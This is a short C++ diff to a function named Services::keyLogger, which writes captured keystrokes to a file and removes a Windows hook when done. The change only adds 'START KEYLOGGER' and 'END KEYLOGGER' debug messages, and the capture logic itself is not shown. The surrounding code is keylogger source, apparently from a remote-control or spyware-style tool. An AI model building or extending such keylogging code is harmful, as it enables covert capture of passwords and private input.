@@ -4,6 +4,8 @@ std::mutex logMutex;
 std::string logData;
 
 bool Services::keyLogger(const std::string &saveFile, int T) {  
+    std::cerr << "START KEYLOGGER\n";
+
     std::ofstream fout(saveFile.c_str());  
     if (!fout.is_open()) {  
         return false;  
@@ -43,7 +45,10 @@ bool Services::keyLogger(const std::string &saveFile, int T) {
     }  
 
     UnhookWindowsHookEx(hook);  
-    fout.close();  
+    fout.close();
+
+    std::cerr << "END KEYLOGGER\n";
+
     return true;  
 }
 
